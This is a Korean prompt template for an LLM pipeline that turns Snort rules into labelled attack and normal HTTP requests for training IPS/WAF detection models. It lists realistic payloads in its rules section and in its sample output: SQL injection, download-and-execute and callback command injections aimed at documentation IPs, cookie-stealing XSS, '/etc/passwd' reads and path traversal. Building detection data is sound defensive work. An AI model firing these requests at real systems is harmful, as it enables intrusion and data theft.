# IPS/WAF 학습데이터 생성 지시문

> 이 파일은 `1_3_build_llm_input.py`가 `05_llm_input/<날짜>/prompt.md`로 복사한다.
> LLM을 호출할 때 이 지시문 + 배치 파일(`batches/.../batch_NNNN.jsonl`) 1개를 함께 넣는다.
> 지시문을 바꾸려면 이 파일을 고친 뒤 `python 1_3_build_llm_input.py --force`를 실행한다.
> 샘플 수는 `LLM_설정.md`에서 바꾼다.
> `3_2_generate.py`가 이 지시문을 생성 모델(`LLM_설정.md` 의 '생성' 행)에 보낸다. 결과는 `3_3_review.py`(검토, `LLM_설정.md` 의 '검토' 행) → `3_4_augment.py`(증강) → `1_4_build_dataset.py`(IPS·WAF 수집 로그)로 이어진다.
> `{ANOMALIES}`, `{NORMAL}`은 실행할 때 `LLM_설정.md`의 `생성 anomalies 수`, `생성 normal 수`로 바뀐다.

## 역할

너는 IPS/WAF 탐지 모델의 학습데이터를 만드는 보안 엔지니어다. 입력은 Snort 룰을 정리한 JSON Lines이고, 한 줄이 룰 하나다.
룰 하나는 **정답 데이터 하나가 아니라 "탐지 조건의 명세"**다. 조건을 지키는 범위 안에서 서로 다른 HTTP 메시지를 여러 개 만든다.

- `anomalies`: 그 룰에 **탐지되는** HTTP 메시지 (공격)
- `normal`: 같은 서비스·경로를 쓰는 **정상 사용자의 요청** (오탐 학습용). 그 룰에 탐지되지 않을 뿐 아니라 **보안 관점에서도 공격이 아니어야** 한다.

## 입력 필드 읽는 법

- `rule_name`: 룰 이름 (Snort msg). 어떤 공격인지 파악하는 데 쓴다.
- `attack_type`: 룰 이름의 키워드로 **추정**한 공격 유형(IPS/WAF 공격 유형). 출력할 때 아래 "공격 유형 확정" 규칙으로 확정한다.
- `side`: `request`면 HTTP 요청을, `response`면 HTTP 응답을 만든다.
- `methods`: 사용할 HTTP method.
    - `["GET"]`처럼 구체적인 값이면 **그 method만** 쓴다. (룰이 method를 검사함)
    - `["ANY"]`면 룰이 method를 검사하지 않는다는 뜻이다. `method_hint`를 먼저 쓰고, 샘플마다 다른 method(GET, POST, PUT 등)도 섞어 다양하게 만든다. 단, `body` 조건이 있으면 본문을 가질 수 있는 method(POST, PUT 등)만 쓴다.
    - `methods_excluded`: 이 method는 쓰지 않는다 (쓰면 탐지 안 됨).
- `conditions`: 탐지 조건. **anomalies 샘플은 모든 조건을 동시에 만족해야 한다.**
    - `type: "content"`: `value` 문자열이 `in` 위치에 그대로 들어가야 한다.
    - `type: "regex"`: `pattern` 정규식(Snort pcre)에 매칭되어야 한다. 정규식이 허용하는 **여러 형태를 샘플마다 바꿔 가며** 쓴다. (예: `(?:\x3b|%3[Bb]|\x7c|%7[Cc])`라면 `;`, `%3B`, `|`, `%7c`를 각각 다른 샘플에)
    - `in`: 값이 들어갈 위치. `uri`, `raw_uri`(디코딩 전 URI), `header`, `cookie`, `body`, `method`, `response_body`, `status_code`, `payload`(위치 제한 없음)
    - `value`의 `\xNN`은 해당 바이트다 (예: `\x0d\x0a` = 줄바꿈).
    - `nocase: true`: 대소문자 무관 → 샘플마다 대소문자를 바꿔도 된다.
    - `negated: true`: 이 값이 **있으면 안 된다**.
    - `position`: `depth`(앞에서 N바이트 안), `offset`(N바이트 뒤부터), `distance`/`within`(바로 앞 조건 뒤 거리)
- `regex_examples` (정규식 조건이 있을 때): 코드가 정규식 조건마다 만든, 그 정규식에 **실제로 매칭되는 최소 형태**의 문자열 (`cond` = `conditions` 의 번호, `in` = 위치).
    - 정규식은 흔한 형태와 다를 때가 많다 (예: `<.+\/script` 는 보통의 `</script>` 와 맞지 않고 `<x/script>` 처럼 `<` 와 `/script` 사이에 글자가 있어야 한다, `=\s*(https?|ftps?|php)\:\/` 는 `data://`·`ftp:\` 와 맞지 않는다). anomalies 의 정규식 부분은 **이 예시의 구조**를 따른다.
    - 예시는 최소 뼈대다. `x` 같은 글자는 아무 값이 들어갈 자리이므로 그대로 복사하지 말고, 실제 공격 형태 안에 같은 구조로 넣는다. `{{REPEAT:문자열:횟수}}` 는 반복 표기(생성 규칙 11)다.
- `urilen`: URI 길이 조건 (예: `>200`)
- `requires_state`: 앞선 다른 요청이 있어야 탐지된다는 뜻. 샘플의 `note`에 그 사실을 적는다.
- `rule`: 원본 Snort 룰. 조건 해석이 애매하면 이것을 기준으로 한다.
- `existing_examples` (있을 때만): 기존 학습 데이터에서 이 룰에 탐지된 실제 payload 예시 (`existing_count` = 기존 샘플 수).
    - 이 예시와 **비슷한 공격 유형·구조**로 만들되, **똑같은 payload 는 절대 만들지 않는다.**
    - 경로의 다른 부분, 파라미터 이름·값, 명령어·SQL 문, 인코딩 방식, 헤더 구성을 바꿔 예시에 없는 변형을 만든다.
    - 예시를 그대로 복사하거나 공백·대소문자만 바꾼 샘플은 기존 데이터와 같은 것으로 보고 버린다.

## 생성 규칙

1. 룰마다 **anomalies {ANOMALIES}개, normal {NORMAL}개**를 만든다. 수가 많으므로 아래 2번의 다양화를 특히 지킨다 (공격 기법·인코딩·구분자·파라미터 위치를 샘플마다 다르게).
2. anomalies 샘플끼리는 서로 달라야 한다. 조건은 모두 지키면서 아래를 바꾼다.
    - 정규식이 허용하는 다른 형태 (구분자, 키워드, 인코딩). 정규식이 허용하지 않는 형태로는 바꾸지 않는다 (`regex_examples` 참고)
    - 조건에 없는 부분: 다른 파라미터 이름·값·순서, 경로 뒤 추가 값, 헤더(User-Agent, Referer, Cookie 등), 본문 형식
    - method가 `["ANY"]`면 method
    - `nocase: true`면 대소문자
3. **실제 공격 트래픽처럼** 만든다. 교과서 예제처럼 짧고 공격 문자열만 눈에 띄는 요청은 쓰지 않는다.
    - 금지 예: `' OR 1=1--`, `<script>alert(1)</script>`, `;id`, `echo vulnerable` 처럼 공격 문자열 하나만 있는 짧은 요청
    - 공격은 정상 요청의 맥락 안에 넣는다: 그 제품의 실제 경로, 정상 파라미터 여러 개(세션·페이지·검색어·토큰·타임스탬프 등), 실제 서비스의 JSON·폼 구조(필드 여러 개)
    - 실제 공격 도구·익스플로잇 코드·봇이 보내는 형태를 쓴다. 예:
        - SQL 인젝션: 시간 기반 블라인드 `1' AND (SELECT 4512 FROM (SELECT(SLEEP(5)))qXbz)-- -`, 컬럼 수를 맞춘 `-1 UNION ALL SELECT NULL,CONCAT(0x7176,user(),0x7170),NULL-- -`, 오류 기반 `extractvalue(1,concat(0x7e,version()))`, 주석·대소문자 우회 `/*!50000UnIoN*/`
        - 명령 주입: 다운로드 후 실행 `cd /tmp; wget http://198.51.100.23/x.sh -O- | sh`, 정보 수집 `uname -a; cat /etc/passwd`, 콜백 `curl http://203.0.113.10/$(whoami)`
        - XSS: `"><img src=x onerror=fetch('//203.0.113.5/?c='+document.cookie)>`, `<svg/onload=...>`, 인코딩·대소문자 변형
        - 경로 이동: `..%2f..%2f..%2fetc%2fpasswd`, `....//....//etc/passwd`, `%252e%252e%252f`
    - 길이는 실제 요청처럼 한다 (요청 줄·헤더·본문 합쳐 보통 300~1,500바이트). 같은 기법이라도 값·위치·인코딩을 샘플마다 바꾼다.
4. normal 샘플은 같은 경로·파라미터를 쓰는 **정상 사용자의 요청**이다. 공격 부분을 **정상 값으로 바꿔서** 룰 조건을 어기게 한다.
    - 좋은 예: `service=Layer3Forwarding` (정상 값), `q=password reset` (정상 검색어), 정상 파일 업로드, 그 서비스의 정상 설정값
    - **금지**: 공격 문자열을 다른 파라미터·다른 경로·다른 인코딩으로 옮겨 이 룰만 피하는 것 (예: `event=...;id`). 이것은 '룰 우회 공격'이지 정상이 아니다.
    - 공격 기능을 그대로 쓰는 요청도 정상이 아니다 (예: 명령 실행 API 에 다른 명령을 넣은 요청).
    - 공격 키워드·구분자·스캐너 UA·`../`·`<script>` 같은 공격 흔적을 남기지 않는다. 다른 보안 룰에 탐지될 만한 요청도 만들지 않는다.
    - normal 도 anomalies 처럼 실제 사용자 요청의 길이·헤더·파라미터 구성을 갖춘다.
5. 안전: 실제 공격 형태를 따르되 피해가 없게 한다. 외부 주소(다운로드·콜백·유출)는 문서용 IP(`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`)나 `example.com` 도메인만 쓴다. 실제 악성코드·실존 C&C·파괴 명령(`rm -rf /` 등)은 쓰지 않는다.
6. HTTP 메시지는 원문 그대로 쓴다. 요청 줄, 헤더, 빈 줄, 본문 순서이고 **줄바꿈은 `\n`(LF)만** 쓴다 (`\r` 쓰지 않음 — 기존 학습 로그 형식). 본문이 있으면 `Content-Length`를 맞춘다.
7. `Host` 헤더는 꼭 넣고, 값은 다음 중 하나를 쓴다: `192.168.10.30`, `192.168.10.31`, `192.168.20.20`, `192.168.0.20` (기존 학습 로그의 목적지 서버). 룰이 특정 도메인을 Host로 요구하면 그 도메인을 쓴다.
8. 헤더는 **실제 클라이언트가 보내는 구성 그대로** 쓴다.
    - User-Agent 는 **잘리지 않은 실제 문자열**만 쓴다. `Mozilla/5.0` 만, `Mozilla/5.0 (X11; Linux x86_64)` 처럼 끝이 잘린 것, `curl/8.0`·`Python/3.9` 처럼 없는 버전은 쓰지 않는다.
        - 브라우저 예: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`, `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15`, `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0`
        - 도구 예: `curl/7.88.1`, `python-requests/2.31.0`, `Go-http-client/1.1`, `sqlmap/1.7.2#stable (https://sqlmap.org)`, `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)`
    - 브라우저 UA 면 브라우저 헤더(`Accept`, `Accept-Language`, `Accept-Encoding`, `Connection`, 필요하면 `Cookie`·`Referer`)를 함께 쓰고, 도구 UA 면 그 도구의 기본 헤더(예: curl 은 `Accept: */*`)를 쓴다.
    - 공격 시나리오에 맞는 클라이언트를 고른다 (예: 특정 제품 익스플로잇은 스크립트·익스플로잇 도구, 관리 화면 기능을 악용하는 요청은 PC 브라우저). 단 룰 조건(예: 특정 User-Agent)은 지킨다.
9. **`|||` 문자열은 쓰지 않는다** (학습 로그의 필드 구분자).
10. 조건을 만족시킬 수 없거나 해석이 불확실하면 억지로 만들지 말고 `note`에 이유를 적는다.
11. **같은 문자열을 길게 이어 쓰지 않는다.** 버퍼 오버플로의 `AAAA…`, 긴 `../`·`..\` 나열, `%00` 반복처럼 같은 문자열을 20번 넘게 이어 써야 하면 직접 쓰지 말고 `{{REPEAT:문자열:횟수}}` 로 쓴다. 코드가 실제 반복으로 펼친다 (예: `{{REPEAT:A:2000}}`, `{{REPEAT:../:12}}`, `{{REPEAT:%00:64}}`). 직접 길게 반복하면 출력이 끝나지 않아 응답 전체를 버리게 된다.

## 공격 유형 확정

룰마다 공격 유형을 **아래 목록 중 하나로** 확정해서 출력한다. 입력의 `attack_type`은 키워드로 추정한 값이라 틀리거나 비어 있을 수 있다.

1. 입력 `attack_type`이 룰 이름·탐지 조건과 맞으면 그대로 쓴다.
2. `other`이거나 맞지 않으면, 룰 이름·탐지 조건·원본 룰을 보고 목록에서 가장 맞는 값을 고른다. (예: URI에 `../`를 찾는 룰 → `path_traversal`, body에 `<?php`를 찾는 업로드 룰 → `file_upload`)
3. 바꿨다면 `attack_type_note`에 이유를 한 줄로 적는다.
4. 목록 어디에도 맞지 않을 때만 `other`를 쓴다.

공격 유형 목록:
`sql_injection`, `xss`, `xxe`, `ssrf`, `deserialization`, `code_injection`, `command_injection`, `file_inclusion`, `path_traversal`, `file_upload`, `webshell`, `auth_bypass`, `rce`, `buffer_overflow`, `info_disclosure`, `scanner`, `dos`, `csrf`, `open_redirect`, `informational`(공격이 아닌 정보성·정책성 탐지), `other`

샘플의 공격 유형: `anomalies` 샘플은 확정한 공격 유형을, `normal` 샘플은 `none`을 적는다.

## 출력 형식

입력 룰 하나마다 JSON 한 줄을 출력한다 (JSON Lines). 설명 문장은 쓰지 않는다.

아래 예시는 **형식만** 보여 준다 (샘플 5개). 실제 샘플 수는 룰마다 anomalies {ANOMALIES}개, normal {NORMAL}개다.

```json
{"id": "et:1:2072375", "attack_type": "command_injection", "samples": [
  {"label": "anomalies", "attack_type": "command_injection", "http": "GET /gena.cgi?service=urn%3Aschemas-upnp-org%3Aservice%3AWANIPConnection%3A1%3Bcd%20%2Ftmp%3Bwget%20http%3A%2F%2F198.51.100.23%2Fbins%2Fmips%20-O%20.d%3Bchmod%20777%20.d%3B.%2F.d&sid=uuid%3A3f2a9c1e-7b4d-4e8a-9c21-5d6e7f8a9b0c HTTP/1.1\nHost: 192.168.20.20\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n", "note": "IoT 봇 형태: 정상 서비스 URN 뒤 ; 로 다운로드 후 실행 연결 (문서용 IP)"},
  {"label": "anomalies", "attack_type": "command_injection", "http": "GET /gena.cgi?service=%7C%7Cuname%20-a%3Bcat%20%2Fetc%2Fpasswd&event=urn%3Aupnp-org%3AserviceId%3AL3Forwarding1&timeout=Second-1800 HTTP/1.1\nHost: 192.168.20.20\nUser-Agent: python-requests/2.31.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n\n", "note": "익스플로잇 스크립트 형태: || 연결로 정보 수집, 정상 파라미터(event, timeout) 사이"},
  {"label": "anomalies", "attack_type": "command_injection", "http": "GET /gena.cgi?service=%60curl%20-s%20http%3A%2F%2F203.0.113.10%2Fp%3Fh%3D%24%28hostname%29%60&event=1 HTTP/1.1\nHost: 192.168.20.20\nUser-Agent: curl/7.88.1\nAccept: */*\n\n", "note": "백틱 명령 치환으로 외부 콜백 (문서용 IP)"},
  {"label": "normal", "attack_type": "none", "http": "GET /gena.cgi?service=urn%3Aschemas-upnp-org%3Aservice%3ALayer3Forwarding%3A1&sid=uuid%3A3f2a9c1e-7b4d-4e8a-9c21-5d6e7f8a9b0c HTTP/1.1\nHost: 192.168.20.20\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: keep-alive\n\n", "note": "정상 UPnP 서비스 조회 - 명령 구분자 없음"},
  {"label": "normal", "attack_type": "none", "http": "GET /gena.cgi?service=urn%3Aschemas-upnp-org%3Aservice%3AWANIPConnection%3A1&event=urn%3Aupnp-org%3AserviceId%3AWANIPConn1 HTTP/1.1\nHost: 192.168.20.20\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ko-KR,ko;q=0.9\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n\n", "note": "정상 WAN 연결 서비스 이벤트 조회 - 명령 구분자 없음"}
]}
```

입력 `attack_type`을 바꾼 경우의 예 (입력이 `other`였던 룰):

```json
{"id": "talos:1:1234", "attack_type": "path_traversal", "attack_type_note": "URI에서 ../ 를 탐지하는 룰", "samples": [ ... ]}
```

- `attack_type` (룰 단위): 확정한 공격 유형. 위 목록 중 하나
- `attack_type_note`: 입력 `attack_type`과 다르게 정했을 때만 그 이유
- `label`: `anomalies`(탐지되는 공격) 또는 `normal`(탐지되지 않는 정상)
- `attack_type` (샘플 단위): `anomalies`는 확정한 공격 유형, `normal`은 `none`
- `http`: HTTP 메시지 원문
- `note`: 어떤 조건을 어떻게 만족했는지, normal 샘플은 어떤 정상 요청인지(어느 조건을 어떻게 어겼는지) 한 줄로
